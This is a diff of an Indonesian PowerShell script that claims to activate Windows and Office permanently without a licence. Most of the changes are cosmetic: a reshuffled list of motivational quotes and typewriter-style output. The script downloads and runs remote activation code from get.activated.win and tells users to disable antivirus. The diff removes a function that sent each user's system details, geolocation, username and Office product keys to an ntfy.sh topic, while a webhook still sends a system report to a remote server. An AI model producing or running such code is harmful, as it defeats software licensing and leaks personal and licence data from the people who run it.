-    "Apa yang membuatmu begitu takut kehilangan, jika sebenarnya tidak ada satu pun di dunia ini yang benar benar menjadi milikmu?"
-    "Banyak orang menjadi tidak menarik setelah kamu mengetahui cara berpikir mereka. - Damian Marley"
-    "Tidak ada yang dapat membunuhmu lebih cepat daripada pikiranmu sendiri. Tetap tenang dan jangan stress atas hal-hal yang berada di luar kendalimu"
-    "Tidak ada yang bisa didapatkan tanpa kehilangan. Bahkan Surga menuntut kematian. - The Eagle"
-    "saya cukup pintar untuk tahu bahwa saya bodoh. - Richard Feynman"
-    "Lebih mudah untuk menipu seseorang daripada meyakinkan mereka bahwa mereka telah ditipu. - Mark Twain"
-    "kenyataan tidak pernah sebaik imajinasimu. - Pepatah Jepang"
-    "Aku talah belajar selama bertahun-tahun bahwa bukan tempat tinggalmu yang penting, melainkan ora-orang yang ada di sekitarmu yang membuatmu merasa di rumah. -J.B. McGee"
-    "Hanya butuh 2 tahun untuk belajar berbicara dan enam puluh tahun untuk belajar diam. - Ernest Hemingway"
-    "Ketika hendak melakukan perjalanan, janganlah meminta nasihat dari orang yan tidak pernah meninggalkan rumah. - Rumi"
-    "Permasalahan dunia adalah orang cerdas penuh keraguan, dan orang bodoh penuh percaya diri. - Bertrand Russell"
-    "Jika segala sesuatu di sekiatar kamu tampak gelap. coba lihat lagi, mungkin kamu yang memancarkan cahaya. - Rumi"
-    "Apa yang kamu pikirkan tentang dirimu jauh lebih penting daripada apa yang orang lain pikirkan tentangmu. Seneca"
-    "Jika rencanamu gagal, ubah rencanamu. Tapi jangan ubah tujuanmu."
-    "Keajaiban terjadi ketika kamu berani melangkah keluar dari zona nyaman."
-    "Jangan pernah berhenti belajar, karena kehidupan tidak pernah berhenti mengajarkan."
-    "Terkadang, yang terbaik bukanlah mendapatkan semua jawaban, tetapi menikmati proses pencariannya."
-    "Kamu lebih kuat dari yang kamu pikirkan."
-    "Hujan turun sebelum pelangi muncul. Begitu juga kesulitan sebelum kebahagiaan."
-    "Orang sukses tidak lebih pintar, mereka hanya lebih gigih."
-    "Satu-satunya hal yang lebih buruk daripada gagal adalah tidak pernah mencoba."
-    "Jangan biarkan kegagalan hari ini membuatmu berhenti mencoba esok hari."
+    "Hal-hal baik membutuhkan waktu, jadi bersikaplah positif dan sabar."
+    "Sebaik-baik manusia adalah yang paling bermanfaat bagi orang lain."
+    "Kemarahan dimulai dengan kegilaan dan berakhir dengan penyesalan."
     "Jangan bandingkan awal perjalananmu dengan pencapaian orang lain."
-    "Apa gunanya mengkhawatirkan sesuatu yang sudak tak terhindarkan - Hayao Miyazaki"
+    "Saya cukup pintar untuk tahu bahwa saya bodoh. - Richard Feynman"
+    "Jika rencanamu gagal, ubah rencanamu. Tapi jangan ubah tujuanmu."
+    "Barang siapa mengenal dirinya, maka ia akan mengenal Tuhannya."
+    "Kenyataan tidak pernah sebaik imajinasimu. - Pepatah Jepang"
+    "Orang sukses tidak lebih pintar, mereka hanya lebih gigih."
+    "Balas dendam terbaik adalah menjadikan dirimu lebih baik."
+    "Berhenti bermimpi, mulailah bekerja dan kejar impianmu."
+    "Keberhasilan datang dari keyakinan pada diri sendiri."
+    "Jangan berhenti mencoba, jangan pernah menyerah."
+    "Hidup itu naik turun, nikmati perjalanannya."
+    "Jangan bandingkan dirimu dengan orang lain."
+    "Cintai dirimu sebelum mencintai orang lain."
+    "Kebahagiaan datang dari hati yang tenang."
+    "Kamu lebih kuat dari yang kamu pikirkan."
+    "Bahagia itu sederhana, bersyukur saja."
+    "Perubahan dimulai dari langkah kecil."
+    "Kebahagiaan sejati datang dari dalam."
+    "Tidak ada jalan pintas menuju puncak."
+    "Keajaiban terjadi saat kamu percaya."
+    "Hidup hanya sekali, jadikan berarti."
+    "Mulai dari sekarang, jangan menunda."
+    "Kunci kebahagiaan adalah bersyukur."
+    "Fokus pada solusi, bukan masalah."
+    "Jangan hanya berlari, melesatlah."
+    "Jadilah cahaya dalam kegelapan."
+    "Jadilah versi terbaik dirimu."
+    "Percayalah pada prosesnya."
 )
 
 # Mengambil satu kata mutiara secara acak
@@ -300,7 +423,7 @@ function WrapTextToFitWidth {
 
     foreach ($word in $words) {
         if (($line.Length + $word.Length + 1) -gt $width) {
-            Write-Host  $line -fore red # Menampilkan baris yang sudah penuh
+            Write-TypeWord  $line "Red" 20 # Menampilkan baris yang sudah penuh
             $line = $word  # Memulai baris baru dengan kata berikutnya
         } else {
             if ($line.Length -gt 0) {
@@ -312,7 +435,8 @@ function WrapTextToFitWidth {
 
     # Menampilkan baris terakhir yang belum dicetak
     if ($line.Length -gt 0) {
-        Write-Host  $line -ForegroundColor red
+        Write-TypeWord  $line "red" 20
+        write-host ""
     }
 }
 
@@ -530,79 +654,6 @@ function Get-IPInfo {
     return Invoke-RestMethod -Uri "http://ip-api.com/json/"
 }
 
-function ntfy {
-    $ntfyUrl = "https://ntfy.sh/eu9QDaPa1mExQPwp"
-    $computerSystem = Get-ComputerSystemInfo
-    $osInfo = Get-OSInfo
-    $processorInfo = Get-ProcessorInfo
-    $ramInfo = Get-RAMInfo
-    $diskInfo = Get-DiskInfo
-    $networkInfo = Get-NetworkInfo
-    $activationStatus = Get-ActivationStatus
-    $officeActivationStatus = Get-OfficeActivationStatus
-    $ipInfo = Get-IPInfo
-
-    $message = @"
-    /// iex(irm indojava.online/get/activeauto) ///
-    ---[ SPESIFIKASI ]-------------------
-    Merek: $($computerSystem.Manufacturer)
-    Model: $($computerSystem.Type) ($($computerSystem.Model))
-    Prosesor: $($processorInfo.Name) ($($processorInfo.Cores) Core) ($($processorInfo.LogicalProcessors) Logical)
-    RAM: $($ramInfo.TotalSizeInGB) GB // $($ramInfo.Modules)
-    Disk Drive:
-    $diskInfo
-    ---[ SISTEM ]-------------------
-    Nama OS: $($osInfo.OSName)
-    Versi OS: $($osInfo.OSVersion)
-    Windows Version: $($osInfo.WindowsVersion)
-    Arsitektur: $($osInfo.Architecture)
-    UserName: $($osInfo.User)
-
-    ---[ NETWORK ]-------------------
-    Wi-Fi Terhubung: $($networkInfo.WifiName)
-    $($networkInfo.LanStatus)
-    $($networkInfo.InternetStatus)
-
-    $($ipInfo.country),  $($ipInfo.city), $($ipInfo.regionName) ($($ipInfo.zip))
-    $($ipInfo.lat)  $($ipInfo.lon) - $($ipInfo.isp)
-
-    ---[ WINDOWS LICENSE ]-------------------
-    $($activationStatus.SlmgrDli)
-    $($activationStatus.SlmgrXpr)
-
-    ---[ MICROSOFT OFFICE ]-------------------
-    $(CheckOhook)
-
-"@
-
-    foreach ($entry in $officeActivationStatus) {
-        $message += @"
-    ---------------------------------------------------------------
-    $($entry.ProductID)
-    $($entry.SkuID)
-    $($entry.LicenseName)
-    $($entry.LicenseDescription)
-    $($entry.LicenseStatus)
-    $($entry.ErrorCode)
-    $($entry.ErrorDescription)
-    $($entry.RemainingGrace)
-    $($entry.ProductKey)
-    
-"@
-    }
-
-    $response = Invoke-RestMethod -Uri $ntfyUrl -Method POST -Body $message -Headers @{
-        "Title" = "Aktivasi Windows dan Office"
-        "Priority" = "default"
-        "Tags" = "computer"
-    }
-
-    if ($response) {
-        Write-host -NoNewLine
-    } else {
-        Write-Host " failed sending log.." -ForegroundColor Red
-    }
-}
 #-----------------------------------------------------------------------------------------
 function webhooks {
     $date = (Get-Date)
@@ -704,7 +755,7 @@ function webhooks {
         #avatar_url = ""
         embeds = @(@{
             title = ":fox: AuroraToolKIT - System Report"
-            description = ":key: **Activation Windows Permanent Digital License**"
+            description = ":key: **Activation Windows Permanent**"
             color = 3447003
             fields = @(
                 @{ name = ""; value = ":calendar: $date`n"; inline = $false },
@@ -727,31 +778,31 @@ function webhooks {
 }
 #-----------------------------------------------------------------------------------------
 Write-Host
-Write-Host
-Write-Host " + GETTING SCRIPT.." -ForegroundColor white
+Write-TypeWord " + GETTING SCRIPT..`n" "white" 25
 Start-Sleep -Seconds 2
-Write-Host " + ACTIVATING.." -ForegroundColor white
+Write-TypeWord "+ ACTIVATING..`n" "white" 25
 
 try {
     # Menjalankan perintah aktivasi
-    & ([ScriptBlock]::Create((Invoke-RestMethod https://get.activated.win))) /Ohook | Out-Null
+    & ([ScriptBlock]::Create((Invoke-RestMethod https://get.activated.win))) /HWID | Out-Null
     start-sleep -Seconds 3
-    Write-Host " >> PROSES AKTIVASI SELESAI.. " -ForegroundColor Green
+    Write-TypeWord " >> PROSES AKTIVASI SELESAI..`n" "Green" 25
     Start-Sleep -Seconds 2
-    write-host " >> CEK STATUS AKTIVASI" -ForegroundColor Yellow
+    Write-TypeWord " >> CEK STATUS AKTIVASI`n" "Yellow" 25
     start-sleep -Seconds 3
     Write-Host "   ----------------------------"
     # Jalankan perintah slmgr.vbs untuk mendapatkan status aktivasi
     $SlmgrXpr = cscript /Nologo "C:\Windows\System32\slmgr.vbs" /xpr 2>&1
 
-    Write-Host "   // Windows Activation Status //" -foregroundColor white
+    Write-TypeWord "   // Windows Activation Status //`n" "white" 20
+    Start-Sleep -seconds 2
 
     # Ubah hasil output menjadi string
     $ActivationStatus = $SlmgrXpr -join " "
     
     # Cek status aktivasi dan tampilkan pesan yang sesuai
     if ($ActivationStatus -match "permanently activated") {
-        write-host "   Windows is permanently activated." -ForegroundColor Green
+        Write-TypeWord "   Windows is permanently activated.`n" "Green" 5
     }
     elseif ($ActivationStatus -match "will expire on (\d{1,2}/\d{1,2}/\d{4})") {
         $ExpireDate = $matches[1]
@@ -770,18 +821,21 @@ try {
     
     # Cek status aktivasi dan tampilkan pesan yang sesuai
     if ($hookActivationStatus -match "Ohook Office aktivasi tidak ditemukan") {
-        Write-Host "   // Office Activation Status //" -foregroundColor white
-        Write-Host "   Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi." -ForegroundColor Red
-        Write-Host "   Pastikan Microsoft Office sudah terinstall. Dan tidak ada aktivator jenis lain." -ForegroundColor Red
+        Write-TypeWord "   // Office Activation Status //`n" "White" 20
+        Start-Sleep -seconds 2
+        Write-TypeWord "   Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi.`n" "Red" 15
+        Write-TypeWord "   Pastikan Microsoft Office sudah terinstall. Dan tidak ada aktivator jenis lain.`n" "Red" 15
         Write-Host "Jika masih gagal disable sementara antivirus selain Windows Defender. Dan silakan jalankan lagi scriptnya." -BackgroundColor Red -ForegroundColor White
     }
     elseif ($hookActivationStatus -match "Ohook for permanent Office activation is installed") {
-        Write-Host "   // Office Activation Status //" -ForegroundColor white
-        Write-Host "   Ohook for permanent Office activation is installed" -ForegroundColor Green
+        Write-TypeWord "   // Office Activation Status //`n" "white" 20
+        Start-Sleep -seconds 2
+        Write-TypeWord "   Ohook for permanent Office activation is installed`n" "Green" 5
+        Start-Sleep -seconds 2
     }
     else {
-        Write-Host "  // Office Activation Status //" -ForegroundColor Red
-        Write-Host "  Office activation status: Unknown atau silakan cek manual." -ForegroundColor Red
+        Write-TypeWord "  // Office Activation Status //`n" "Red" 20
+        Write-TypeWord "  Office activation status: Unknown atau silakan cek manual.`n" "Red" 20
     }
 
 }
@@ -794,9 +848,10 @@ catch {
 }
 
 Write-Host
-Write-Host " > > MENGIRIM INFORMASI KE SERVER . ." -ForegroundColor blue
-#ntfy
+Write-TypeWord " > > MENGIRIM INFORMASI KE SERVER . ." "Blue" 20
+
 webhooks
+write-host
 $EndDTM = (Get-Date)
 Write-Host "  END  " -BackgroundColor Red -ForegroundColor White -NoNewline
 Write-Host " $EndDTM " -BackgroundColor White -ForegroundColor Black -NoNewLine
@@ -815,12 +870,12 @@ Write-Host " ENTER " -NoNewLine -BackgroundColor red -ForegroundColor white
 Write-Host " TO EXIT:" -NoNewLine
 $shell = New-Object -ComObject WScript.Shell
 # Menampilkan pesan popup
-$shell.Popup("AKTIVASI WINDOWS DAN OFFICE PERMANEN SUDAH SELESAI..", 30, "OLIH X SARGA ~// -- INDOJAVA ONLINE") | Out-Null
+$shell.Popup("AKTIVASI WINDOWS DAN OFFICE PERMANEN SUDAH SELESAI..", 15, "OLIH X SARGA ~// -- INDOJAVA ONLINE") | Out-Null
 $shell.Popup("JANGAN LUPA BAHAGIA, DAN TERSENYUM.. :)", 10, "OLIH X SARGA ~// -- INDOJAVA ONLINE") | Out-Null
 Read-Host
 #-----------------------------------------------------------------------------------------
 Start-Process powershell -ArgumentList "-NoExit", "-Command & {
-    mode con cols=70 lines=32
+    mode con cols=70 lines=26
     Clear-Host
     Write-Output @'
  ....................................................................
@@ -849,9 +904,7 @@ Start-Process powershell -ArgumentList "-NoExit", "-Command & {
  ....................................................................
 
 '@ | Out-Host
-write-host
-write-host
-    Read-Host 'Tekan ENTER untuk keluar'
+    start-sleep -seconds 10
     exit
 }"
 
